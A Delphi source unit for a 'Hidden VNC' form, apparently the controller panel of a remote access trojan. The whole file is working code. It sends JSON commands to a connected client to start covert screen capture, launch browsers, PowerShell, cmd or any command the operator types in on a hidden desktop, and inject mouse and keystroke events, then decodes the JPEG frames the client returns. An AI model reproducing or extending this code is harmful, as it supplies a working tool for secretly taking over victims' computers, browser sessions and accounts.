unit UnitHiddenVNC;

interface

uses
  Winapi.Windows, Winapi.Messages,
  System.SysUtils, System.Variants, System.Classes, System.JSON, System.Math,
  System.NetEncoding, System.StrUtils, System.SyncObjs,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.ExtCtrls,
  Vcl.StdCtrls, Vcl.Imaging.jpeg, Vcl.Imaging.pngimage,
  ncLines;

type
  TVNCSendJSONEvent   = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TVNCFormClosedEvent = procedure(aLine: TncLine) of object;

  TNoFlickerPaintBox = class(TPaintBox)
  protected
    procedure WMEraseBkgnd(var Msg: TWMEraseBkgnd); message WM_ERASEBKGND;
  end;

type
  TForm10 = class(TForm)
    PaintBox1: TPaintBox;
    StatusBar1: TStatusBar;
    Panel1: TPanel;
    Button1: TButton;
    ComboBox1: TComboBox;
    ComboBox2: TComboBox;
    Button2: TButton;
    Button3: TButton;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure ComboBox1Change(Sender: TObject);
  private
    FLine             : TncLine;
    FClientID         : string;
    FOnSendJSON       : TVNCSendJSONEvent;
    FOnFormClosed     : TVNCFormClosedEvent;
    FCapturing        : Boolean;
    FLastFrameSize    : Integer;
    FLastStatusTick   : UInt64;
    FFrameTimer       : TTimer;
    FPendingFrameBytes: TBytes;
    FFrameLock        : TCriticalSection;
    FDecodeEvent      : TEvent;
    FDecodeThread     : TThread;
    FDecodeStopping   : Boolean;
    FDecodedBitmap    : TBitmap;
    FDecodedFrameSize : Integer;
    FDisplayBitmap    : TBitmap;
    FPaintBox         : TNoFlickerPaintBox;
    FLastMouseMoveTick: UInt64;

    procedure FillDefaultOptions;
    procedure SendVNCCommand(const AAction: string; AParams: TJSONObject = nil);
    function  SelectedQualityPercent: Integer;
    function  JSONValueText(JSONObj: TJSONObject; const AName: string): string;
    function  DecodeFrameToBitmap(const ABytes: TBytes; out ABitmap: TBitmap): Boolean;
    procedure FrameTimerTimer(Sender: TObject);
    procedure PaintBoxPaint(Sender: TObject);
    procedure PaintFrameBitmap(ABitmap: TBitmap; AFrameSize: Integer);
    procedure StartFrameWorker;
    procedure StopFrameWorker;
    procedure DecodeFrameWorker;
    function  TakePendingFrame(out ABytes: TBytes): Boolean;
    function  TakeDecodedFrame(out ABitmap: TBitmap; out AFrameSize: Integer): Boolean;
    procedure UpdateStatusBar;
    procedure UpdateButtonCaption;

    procedure FPaintBoxMouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
    procedure FPaintBoxMouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
    procedure FPaintBoxMouseUp(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
    procedure FormKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
  protected
    procedure DoClose(var Action: TCloseAction); override;
  public
    destructor Destroy; override;

    procedure SetupForClient(aLine: TncLine; const AClientID: string;
      ASendJSON: TVNCSendJSONEvent; AFormClosed: TVNCFormClosedEvent);
    procedure DetachCallbacks;
    procedure RequestCaptureStart;
    procedure RequestCaptureStop;
    procedure QueueFrameBytes(const ABytes: TBytes);
    procedure HandleHiddenVNCJSON(JSONObj: TJSONObject);
  end;

var
  Form10: TForm10;

implementation

{$R *.dfm}

{ TNoFlickerPaintBox }

procedure TNoFlickerPaintBox.WMEraseBkgnd(var Msg: TWMEraseBkgnd);
begin
  Msg.Result := 1;
end;

{ TForm10 }

destructor TForm10.Destroy;
begin
  if FCapturing and Assigned(FOnSendJSON) and Assigned(FLine) then
    RequestCaptureStop;

  StopFrameWorker;

  if Assigned(FFrameTimer) then
    FFrameTimer.Enabled := False;

  if Assigned(FOnFormClosed) and Assigned(FLine) then
    FOnFormClosed(FLine);

  DetachCallbacks;
  FreeAndNil(FFrameTimer);
  FreeAndNil(FDecodedBitmap);
  FreeAndNil(FDisplayBitmap);
  FreeAndNil(FDecodeEvent);
  FreeAndNil(FFrameLock);
  inherited;
end;

procedure TForm10.DetachCallbacks;
begin
  FOnSendJSON   := nil;
  FOnFormClosed := nil;
end;

procedure TForm10.DoClose(var Action: TCloseAction);
begin
  if FCapturing then
    RequestCaptureStop;

  StopFrameWorker;

  if Assigned(FFrameTimer) then
    FFrameTimer.Enabled := False;
  SetLength(FPendingFrameBytes, 0);

  if Assigned(FOnFormClosed) and Assigned(FLine) then
    FOnFormClosed(FLine);

  DetachCallbacks;
  if Form10 = Self then
    Form10 := nil;

  inherited;
  Action := caFree;
end;

procedure TForm10.SetupForClient(aLine: TncLine; const AClientID: string;
  ASendJSON: TVNCSendJSONEvent; AFormClosed: TVNCFormClosedEvent);
begin
  FLine             := aLine;
  FClientID         := AClientID;
  FOnSendJSON       := ASendJSON;
  FOnFormClosed     := AFormClosed;
  FCapturing        := False;
  FLastFrameSize    := 0;
  FLastStatusTick   := 0;
  SetLength(FPendingFrameBytes, 0);
  FDecodeStopping   := False;
  FDecodedFrameSize := 0;

  if not Assigned(FFrameLock) then
    FFrameLock := TCriticalSection.Create;
  if not Assigned(FDecodeEvent) then
    FDecodeEvent := TEvent.Create(nil, True, False, '');

  if not Assigned(FFrameTimer) then
  begin
    FFrameTimer          := TTimer.Create(Self);
    FFrameTimer.Enabled  := False;
    FFrameTimer.Interval := 33;
    FFrameTimer.OnTimer  := FrameTimerTimer;
  end;

  StartFrameWorker;

  if not Assigned(FDisplayBitmap) then
  begin
    FDisplayBitmap             := TBitmap.Create;
    FDisplayBitmap.PixelFormat := pf24bit;
  end;

  if not Assigned(FPaintBox) then
  begin
    PaintBox1.Visible := False;

    FPaintBox          := TNoFlickerPaintBox.Create(Self);
    FPaintBox.Parent   := PaintBox1.Parent;
    FPaintBox.SetBounds(PaintBox1.Left, PaintBox1.Top,
                        PaintBox1.Width, PaintBox1.Height);
    FPaintBox.Align    := PaintBox1.Align;
    FPaintBox.Anchors  := PaintBox1.Anchors;
    FPaintBox.OnPaint  := PaintBoxPaint;

    FPaintBox.OnMouseDown := FPaintBoxMouseDown;
    FPaintBox.OnMouseMove := FPaintBoxMouseMove;
    FPaintBox.OnMouseUp   := FPaintBoxMouseUp;

    if FPaintBox.Parent is TWinControl then
      TWinControl(FPaintBox.Parent).DoubleBuffered := True;
  end;

  Caption        := 'Hidden VNC - ' + FClientID;
  DoubleBuffered := True;
  KeyPreview     := True;
  OnKeyDown      := FormKeyDown;
  OnKeyUp        := FormKeyUp;

  // Explicitly assign events
  Button1.OnClick    := Button1Click;
  Button2.OnClick    := Button2Click;
  Button3.OnClick    := Button3Click;
  ComboBox1.OnChange := ComboBox1Change;

  FillDefaultOptions;
  UpdateButtonCaption;
  UpdateStatusBar;
end;

procedure TForm10.FillDefaultOptions;
var
  i: Integer;
begin
  ComboBox1.Items.BeginUpdate;
  try
    ComboBox1.Items.Clear;
    for i := 1 to 10 do
      ComboBox1.Items.Add(IntToStr(i * 10) + '%');
    ComboBox1.ItemIndex := 4; // 50%
  finally
    ComboBox1.Items.EndUpdate;
  end;

  ComboBox2.Items.BeginUpdate;
  try
    ComboBox2.Items.Clear;
    ComboBox2.Items.Add('chrome.exe');
    ComboBox2.Items.Add('msedge.exe');
    ComboBox2.Items.Add('brave.exe');
    ComboBox2.Items.Add('powershell.exe');
    ComboBox2.Items.Add('cmd.exe');
    ComboBox2.ItemIndex := 0;
  finally
    ComboBox2.Items.EndUpdate;
  end;
end;

function TForm10.SelectedQualityPercent: Integer;
begin
  Result := StrToIntDef(StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]), 50);
end;

procedure TForm10.SendVNCCommand(const AAction: string; AParams: TJSONObject = nil);
var
  JSONObj: TJSONObject;
  i: Integer;
begin
  if not Assigned(FLine) or not Assigned(FOnSendJSON) then
    Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', AAction);
    if Assigned(AParams) then
    begin
      for i := 0 to AParams.Count - 1 do
        JSONObj.AddPair(AParams.Pairs[i].JsonString.Value, AParams.Pairs[i].JsonValue.Clone as TJSONValue);
    end;
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm10.RequestCaptureStart;
var
  Params: TJSONObject;
begin
  FCapturing := True;
  FFrameTimer.Enabled := True;
  Params := TJSONObject.Create;
  try
    Params.AddPair('scale',   TJSONNumber.Create(50));
    Params.AddPair('quality', TJSONNumber.Create(SelectedQualityPercent));
    SendVNCCommand('vncstart', Params);
  finally
    Params.Free;
  end;
  UpdateButtonCaption;
  UpdateStatusBar;
end;

procedure TForm10.RequestCaptureStop;
begin
  SendVNCCommand('vncstop');
  FCapturing := False;
  FFrameLock.Enter;
  try
    SetLength(FPendingFrameBytes, 0);
    FreeAndNil(FDecodedBitmap);
    FDecodedFrameSize := 0;
    if Assigned(FDecodeEvent) then
      FDecodeEvent.ResetEvent;
  finally
    FFrameLock.Leave;
  end;
  FFrameTimer.Enabled := False;
  UpdateButtonCaption;
  UpdateStatusBar;
end;

procedure TForm10.Button1Click(Sender: TObject);
begin
  if FCapturing then
    RequestCaptureStop
  else
    RequestCaptureStart;
end;

procedure TForm10.Button2Click(Sender: TObject);
var
  Params: TJSONObject;
begin
  if ComboBox2.Text = '' then Exit;
  Params := TJSONObject.Create;
  try
    Params.AddPair('path', ComboBox2.Text);
    SendVNCCommand('run', Params);
  finally
    Params.Free;
  end;
end;

procedure TForm10.Button3Click(Sender: TObject);
var
  Path: string;
  Params: TJSONObject;
begin
  if InputQuery('Custom Process', 'Enter process path or command:', Path) then
  begin
    if Path = '' then Exit;
    Params := TJSONObject.Create;
    try
      Params.AddPair('path', Path);
      SendVNCCommand('run', Params);
    finally
      Params.Free;
    end;
  end;
end;

procedure TForm10.ComboBox1Change(Sender: TObject);
begin
  if FCapturing then RequestCaptureStart;
end;

function TForm10.JSONValueText(JSONObj: TJSONObject; const AName: string): string;
var
  Val: TJSONValue;
begin
  Result := '';
  if JSONObj = nil then Exit;
  Val := JSONObj.Values[AName];
  if Assigned(Val) then Result := Val.Value;
end;

procedure TForm10.QueueFrameBytes(const ABytes: TBytes);
begin
  if Length(ABytes) = 0 then Exit;
  FFrameLock.Enter;
  try
    FPendingFrameBytes := Copy(ABytes, 0, Length(ABytes));
    if Assigned(FDecodeEvent) then
      FDecodeEvent.SetEvent;
  finally
    FFrameLock.Leave;
  end;
end;

procedure TForm10.FrameTimerTimer(Sender: TObject);
var
  Bitmap: TBitmap;
  Size: Integer;
begin
  if TakeDecodedFrame(Bitmap, Size) then
  begin
    try
      PaintFrameBitmap(Bitmap, Size);
    finally
      Bitmap.Free;
    end;
  end;
end;

procedure TForm10.PaintBoxPaint(Sender: TObject);
begin
  if not Assigned(FDisplayBitmap) or (FDisplayBitmap.Width <= 0) then
  begin
    FPaintBox.Canvas.Brush.Color := clBlack;
    FPaintBox.Canvas.FillRect(FPaintBox.ClientRect);
    Exit;
  end;
  FPaintBox.Canvas.StretchDraw(FPaintBox.ClientRect, FDisplayBitmap);
end;

procedure TForm10.PaintFrameBitmap(ABitmap: TBitmap; AFrameSize: Integer);
begin
  if not Assigned(FDisplayBitmap) then
  begin
    FDisplayBitmap := TBitmap.Create;
    FDisplayBitmap.PixelFormat := pf24bit;
  end;

  if (FDisplayBitmap.Width <> ABitmap.Width) or (FDisplayBitmap.Height <> ABitmap.Height) then
    FDisplayBitmap.SetSize(ABitmap.Width, ABitmap.Height);

  FDisplayBitmap.Canvas.Draw(0, 0, ABitmap);

  if Assigned(FPaintBox) then
    FPaintBox.Canvas.StretchDraw(FPaintBox.ClientRect, ABitmap);

  FLastFrameSize := AFrameSize;
  if (GetTickCount64 - FLastStatusTick) >= 500 then
  begin
    FLastStatusTick := GetTickCount64;
    UpdateStatusBar;
  end;
end;

function TForm10.DecodeFrameToBitmap(const ABytes: TBytes; out ABitmap: TBitmap): Boolean;
var
  Stream: TMemoryStream;
  Jpeg: TJPEGImage;
begin
  Result := False;
  ABitmap := nil;
  Stream := TMemoryStream.Create;
  Jpeg := TJPEGImage.Create;
  try
    Stream.WriteBuffer(ABytes[0], Length(ABytes));
    Stream.Position := 0;
    try
      Jpeg.LoadFromStream(Stream);
      ABitmap := TBitmap.Create;
      ABitmap.PixelFormat := pf24bit;
      ABitmap.SetSize(Jpeg.Width, Jpeg.Height);
      ABitmap.Canvas.Draw(0, 0, Jpeg);
      Result := True;
    except
      if Assigned(ABitmap) then FreeAndNil(ABitmap);
    end;
  finally
    Jpeg.Free;
    Stream.Free;
  end;
end;

procedure TForm10.StartFrameWorker;
begin
  if not Assigned(FFrameLock) then
    FFrameLock := TCriticalSection.Create;
  if not Assigned(FDecodeEvent) then
    FDecodeEvent := TEvent.Create(nil, True, False, '');

  FDecodeStopping := False;
  FDecodeThread := TThread.CreateAnonymousThread(
    procedure
    begin
      DecodeFrameWorker;
    end);
  FDecodeThread.FreeOnTerminate := False;
  FDecodeThread.Start;
end;

procedure TForm10.StopFrameWorker;
begin
  FDecodeStopping := True;
  if Assigned(FDecodeEvent) then
    FDecodeEvent.SetEvent;

  if Assigned(FDecodeThread) then
  begin
    FDecodeThread.WaitFor;
    FreeAndNil(FDecodeThread);
  end;
end;

procedure TForm10.DecodeFrameWorker;
var
  Bytes: TBytes;
  Decoded: TBitmap;
  Size: Integer;
begin
  while not FDecodeStopping do
  begin
    if Assigned(FDecodeEvent) then
      FDecodeEvent.WaitFor(100);

    while not FDecodeStopping and TakePendingFrame(Bytes) do
    begin
      Size := Length(Bytes);
      Decoded := nil;
      if DecodeFrameToBitmap(Bytes, Decoded) then
      begin
        FFrameLock.Enter;
        try
          FreeAndNil(FDecodedBitmap);
          FDecodedBitmap := Decoded;
          FDecodedFrameSize := Size;
        finally
          FFrameLock.Leave;
        end;
      end;
    end;
  end;
end;

function TForm10.TakePendingFrame(out ABytes: TBytes): Boolean;
begin
  Result := False;
  FFrameLock.Enter;
  try
    if Length(FPendingFrameBytes) > 0 then
    begin
      ABytes := FPendingFrameBytes;
      SetLength(FPendingFrameBytes, 0);
      Result := True;
    end;
    if (Length(FPendingFrameBytes) = 0) and Assigned(FDecodeEvent) then
      FDecodeEvent.ResetEvent;
  finally
    FFrameLock.Leave;
  end;
end;

function TForm10.TakeDecodedFrame(out ABitmap: TBitmap; out AFrameSize: Integer): Boolean;
begin
  Result := False;
  FFrameLock.Enter;
  try
    if Assigned(FDecodedBitmap) then
    begin
      ABitmap := FDecodedBitmap;
      AFrameSize := FDecodedFrameSize;
      FDecodedBitmap := nil;
      Result := True;
    end;
  finally
    FFrameLock.Leave;
  end;
end;

procedure TForm10.UpdateStatusBar;
var
  StatusStr: string;
begin
  if FCapturing then StatusStr := 'Capturing [On]' else StatusStr := 'Capturing [Off]';

  if StatusBar1.Panels.Count >= 2 then
  begin
    StatusBar1.Panels[0].Text := StatusStr;
    StatusBar1.Panels[1].Text := 'Size [' + FormatFloat('0.0 KB', FLastFrameSize / 1024) + ']';
  end
  else
    StatusBar1.SimpleText := StatusStr + ' - Size [' + FormatFloat('0.0 KB', FLastFrameSize / 1024) + ']';
end;

procedure TForm10.UpdateButtonCaption;
begin
  if FCapturing then
    Button1.Caption := 'Stop VNC'
  else
    Button1.Caption := 'Start VNC';
end;

procedure TForm10.HandleHiddenVNCJSON(JSONObj: TJSONObject);
var
  Action, Status, Error: string;
begin
  Action := JSONValueText(JSONObj, 'action');
  if (Action = 'hiddenvnc_status') or (Action = 'hiddenvnc_initialized') then
  begin
    Status := JSONValueText(JSONObj, 'status');
    if Status = '' then Status := Action;

    if SameText(Status, 'started') then FCapturing := True
    else if SameText(Status, 'stopped') then FCapturing := False;

    if StatusBar1.Panels.Count > 0 then
       StatusBar1.Panels[0].Text := 'Status: ' + Status
    else
       StatusBar1.SimpleText := 'Status: ' + Status;

    UpdateButtonCaption;
    UpdateStatusBar;
  end
  else if Action = 'hiddenvnc_error' then
  begin
    Error := JSONValueText(JSONObj, 'error');
    if Error <> '' then
       MessageBox(Handle, PChar(Error), 'VNC Error', MB_OK or MB_ICONERROR);
  end;
end;

procedure TForm10.FPaintBoxMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  Params: TJSONObject;
begin
  Params := TJSONObject.Create;
  try
    Params.AddPair('event', 'down');
    Params.AddPair('button', TJSONNumber.Create(Ord(Button)));
    Params.AddPair('x', TJSONNumber.Create(Round(X * 65535 / Max(1, FPaintBox.Width))));
    Params.AddPair('y', TJSONNumber.Create(Round(Y * 65535 / Max(1, FPaintBox.Height))));
    SendVNCCommand('mouseevent', Params);
  finally
    Params.Free;
  end;
end;

procedure TForm10.FPaintBoxMouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
var
  NowTick: UInt64;
  Params: TJSONObject;
begin
  NowTick := GetTickCount64;
  if (NowTick - FLastMouseMoveTick) < 50 then Exit;
  FLastMouseMoveTick := NowTick;
  Params := TJSONObject.Create;
  try
    Params.AddPair('event', 'move');
    Params.AddPair('x', TJSONNumber.Create(Round(X * 65535 / Max(1, FPaintBox.Width))));
    Params.AddPair('y', TJSONNumber.Create(Round(Y * 65535 / Max(1, FPaintBox.Height))));
    SendVNCCommand('mouseevent', Params);
  finally
    Params.Free;
  end;
end;

procedure TForm10.FPaintBoxMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  Params: TJSONObject;
begin
  Params := TJSONObject.Create;
  try
    Params.AddPair('event', 'up');
    Params.AddPair('button', TJSONNumber.Create(Ord(Button)));
    Params.AddPair('x', TJSONNumber.Create(Round(X * 65535 / Max(1, FPaintBox.Width))));
    Params.AddPair('y', TJSONNumber.Create(Round(Y * 65535 / Max(1, FPaintBox.Height))));
    SendVNCCommand('mouseevent', Params);
  finally
    Params.Free;
  end;
end;

procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
var
  Params: TJSONObject;
begin
  Params := TJSONObject.Create;
  try
    Params.AddPair('event', 'down');
    Params.AddPair('key', TJSONNumber.Create(Key));
    SendVNCCommand('keyevent', Params);
  finally
    Params.Free;
  end;
end;

procedure TForm10.FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
var
  Params: TJSONObject;
begin
  Params := TJSONObject.Create;
  try
    Params.AddPair('event', 'up');
    Params.AddPair('key', TJSONNumber.Create(Key));
    SendVNCCommand('keyevent', Params);
  finally
    Params.Free;
  end;
end;

end.
